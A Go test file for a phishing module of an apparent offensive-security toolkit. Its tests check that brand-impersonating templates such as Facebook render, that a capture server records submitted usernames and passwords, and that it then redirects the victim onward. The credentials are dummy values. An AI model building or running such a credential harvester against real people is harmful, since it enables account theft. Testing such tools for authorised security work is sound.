package phish

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"github.com/QYVORA/qyvora-toha3ee/internal/events"
	"github.com/QYVORA/qyvora-toha3ee/internal/store"
)

func TestAllTemplatesRender(t *testing.T) {
	for _, tmpl := range ListTemplates() {
		htmlOut, err := Render(tmpl.ID, DefaultFields(tmpl.ID))
		if err != nil {
			t.Fatalf("render %s: %v", tmpl.ID, err)
		}
		if !strings.Contains(htmlOut, "</html>") {
			t.Errorf("template %s output lacks closing html tag", tmpl.ID)
		}
	}
}

func TestCaptureServerHarvestsCredentials(t *testing.T) {
	db := store.New(100)
	bus := events.NewBus()
	srv := NewCaptureServer(":0", db, bus, nil)
	ts := httptest.NewServer(srv.Handler())
	defer ts.Close()

	page, err := http.Get(ts.URL + "/phish/facebook")
	if err != nil {
		t.Fatal(err)
	}
	body := readAll(t, page)
	if !strings.Contains(body, "Facebook") {
		t.Fatalf("page missing brand: %s", body)
	}

	form := url.Values{}
	form.Set("username", "alice@example.com")
	form.Set("password", "s3cret")
	form.Set("orig", "/home")
	client := &http.Client{CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}}
	resp, err := client.PostForm(ts.URL+"/phish/facebook/submit", form)
	if err != nil {
		t.Fatal(err)
	}
	_ = resp.Body.Close()
	if resp.StatusCode != http.StatusFound {
		t.Fatalf("expected redirect, got %d", resp.StatusCode)
	}
	if loc := resp.Header.Get("Location"); loc != "/home" {
		t.Fatalf("expected redirect to orig, got %q", loc)
	}

	creds := db.Creds()
	if len(creds) != 1 {
		t.Fatalf("expected 1 credential, got %d", len(creds))
	}
	c := creds[0]
	if c.Username != "alice@example.com" || c.Password != "s3cret" {
		t.Fatalf("bad cred: %+v", c)
	}
	if c.Source != "phish:facebook" {
		t.Fatalf("bad source: %s", c.Source)
	}
	if len(db.CredsBySource("phish")) != 1 {
		t.Fatal("CredsBySource filter failed")
	}
}

func TestUnknownTemplate404(t *testing.T) {
	db := store.New(100)
	srv := NewCaptureServer(":0", db, events.NewBus(), nil)
	ts := httptest.NewServer(srv.Handler())
	defer ts.Close()
	resp, err := http.Get(ts.URL + "/phish/nope")
	if err != nil {
		t.Fatal(err)
	}
	_ = resp.Body.Close()
	if resp.StatusCode != http.StatusNotFound {
		t.Fatalf("expected 404, got %d", resp.StatusCode)
	}
}

func TestNormalizeTemplateID(t *testing.T) {
	if got := NormalizeTemplateID("/phish/GOOGLE"); got != "google" {
		t.Fatalf("got %q", got)
	}
	if got := NormalizeTemplateID("facebook"); got != "facebook" {
		t.Fatalf("got %q", got)
	}
}

func readAll(t *testing.T, resp *http.Response) string {
	t.Helper()
	defer func() { _ = resp.Body.Close() }()
	var b strings.Builder
	buf := make([]byte, 4096)
	for {
		n, err := resp.Body.Read(buf)
		b.Write(buf[:n])
		if err != nil {
			break
		}
	}
	return b.String()
}
